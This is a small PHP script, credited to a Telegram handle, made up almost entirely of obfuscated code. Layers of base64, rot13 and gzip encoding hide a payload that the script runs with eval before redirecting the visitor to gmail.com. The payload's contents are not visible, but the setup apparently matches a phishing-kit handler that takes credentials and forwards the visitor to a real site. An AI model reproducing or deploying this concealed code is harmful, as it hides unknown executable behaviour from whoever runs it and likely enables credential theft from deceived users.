<?php

//----Created by @orbitx on Telegram----//

$i1i='========================================================================
	Obfuscation provided by Unknowndevice64 - Free Online PHP Obfuscator
				http://www.ud64.com/
==============================================================================';


$uD64_c0m="\163\164\x72\x5f\162\x6f\164"."13";$uD64_Com="\147\x7a\151\x6e\x66\x6c\141\164\x65";$uD64_C0m="\142\x61\x73\14564\x5f\x64\x65\143o\144\145";$x0zRy=$uD64_Com($uD64_C0m($uD64_c0m("SMQYqcfjNRD/XNgYYouzxLHE0bxRNiDRr5p6PGnFN4xqt/w60iJpZ3CinZ1wghPgEzsOICqUj1wlljxjg/+2ut8p3n3lxlf8wlbRixE/m+tl48YDKrHfdbP5pQQRn55VB20oZMM17k4UxamL4A9YGN50TMk1VliV+SLNxGPLqfeNhyDLgcdViO/BUZ5pMB6zQK1dZxgnEQ9yEihpkPsxbAOOQOJ+clJtay7BdpPEn/SjMJD00eyjJXybQ4VyLunOxTLOa8nMP7CBFE3/ypFzSMFdQW7YP8614nNBCXvyT0KCE4SBd+AgHlU4LqT4M9ygMiu4LU73gr6F6xYruTnglZcn9ySvS/Bwrj4Yi7+hGN82/srBAwznFriaL46u1JwBWZGekz5usnlSaa4XsXloWqbVCCKZ3QMTw5VhivyP2EDDixc1mXgfU63qR3VNXwB+pE3AuqyARclWtsFc9C7SRyVHXyUJGdC0lHzMhXuVzhrNElno88WAq6cN0ApHJLk3gI/Mj7O6U1mhjUsqv8G0cF7NiMIY+qcdcwwOI953FE7BY9jBJj7SDlAvTom9lcqoxTO8y0n+58hkHIoRNbTUSfZ39nsscnMKP3tj6181FYiQshkD9/m8Qj==")));@eval($uD64_c0m('$k0xEm="MIKoogf4RC2IbhuQv7kDwh0xXNdfYMTcYdESpbnBQY8Hmd5fHdaGyIgqia7Uqv8C+2NL5CNZm5xmUY0oJYGcC70ST75dfJPT8n4L09plzsdIFT/GjJPEBYBBVlvth0aUiIBQaQd/b7v+mqwFesNFGlE0eElKSU9rhCcISpWcgTjfemtxKUNkT3YEiuWBX/68yCM+lX/kc0g86NHXscVQ3cpUBGBj85aDW+ARSDq2Ztq2KlFlD9tE390cp0gGJZa0LJnyd9iZAcKvPeJ/4ScUhNXeJEy3bkYIJp+6jNfie6QYNnn+iBcpS/nft01JSk37dj6dQ7e6cRq+hqqq7d0bY90Y8hSnW32gR6GUqsrdpiiZZGTseMH/5PRjMqKPWr6mpsYx6A7ltR3hwpippMVkoNchAzfVGD58oud+y2TwcB0nnoSGQo6F7eavbISB7yCYNz0mj3TDfBgKxRoFuwgQqInjnjes+gGgEuK6QrRsZduhQpv5jsOQ2L2PWV1XglCqKIuQBapviPu8mcEspdEmTEWsZT6qBSst7fRW7dJKr+K5cUFYFR+JGwXmV33pRI8IVv2QwvmcYzA8fRCap8N2N7rEQHM26ASMoOKU76gD9poeS4Ow5PQ6bbXrFKQPPVkVq1/T+aGTy7QbZmOCcWhcjCd8jK5AsWJqZwsjHE00+qNVFK2vVUlGbTeaf0sR9g4VmzDjFfXZT1rCWb6dSrW+sMv+TXumfA2xRWdcWZlcCcUlwaGKq9aVwjeVA9PZ6wOD3p/phO2mEkQ1DSbw0v1xje2lZaXADQznQFkV9jSs8kTQj3oZzXyXjAana57Vj7yx6OKKHD4aDK53cUILrLCeERLeVC9gzXjTg1F2vmYUOjKAJsr9fgtbkVppcbk8w/DtPfWyqfGoNxXUV+4IIN+LHTHkmUQxH4a6IL36kHX4ZooKuGrvTA3wRjolT4ZHLMnEa4JiMfJMN9O9moWnZsVW5ZGn7bMpGrIV/OZqRSzaNi9KPExIKw0P8UfQYOGkEvy631Xb5EeBsqX2FbFbCWwa3YqAEwtKry16b6wBY9GKmNKrlbM8FacUp2nvJCurObkVkjGqLaFPAnE7Vtq2FmvBb3Tycs4vidKLYTIPojMbCbUEEHm8LY+2HRKHe0qSeLnHA7sIDknmgiEd6Ho5yq7WJKrGtz4ILSrT3Fxs0jzv7dv2K2Iv1NbJxlsOwcc132EpEp7KR+G17/zxoR0qfitme6wR+FUg13UK5X5zBvj5mnz99ABzhhQZ+IlJQfsOpBcASgHe2Z00gNsA9H068VS0Zk3sQ9KCArxzi0kXp2AkzEhDsxf9mn0LK9qr/8DWJjMIJ3iW+93SDcELAENsQm/a3urSJs1x6/Z6Yj9asfrW/Z1iWhjsKqadS46SbsDMi+DIoI4gwc/rsama2oNWa95hb+aggc//f41z821/A6s1wC4a22t+3sLm2c+s1/Fw9FH2i6Jmq7/JyBajBkBucuTqCzrporsm7n8p0+yy53/Li/7+8nI58/7Ayp37n6e37l5seN8sCam8Qj==";@riny(tmvasyngr(onfr64_qrpbqr($k0xEm)));'));


header('location:https://gmail.com');

?>
